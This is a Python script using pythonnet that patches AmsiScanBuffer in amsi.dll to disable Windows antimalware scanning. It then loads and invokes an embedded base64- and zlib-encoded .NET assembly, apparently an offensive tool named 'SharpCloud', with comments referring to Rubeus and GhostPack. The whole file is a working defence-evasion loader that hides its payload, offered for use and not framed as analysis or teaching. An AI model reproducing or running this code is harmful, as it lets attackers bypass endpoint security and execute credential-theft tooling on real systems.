import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCloud.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()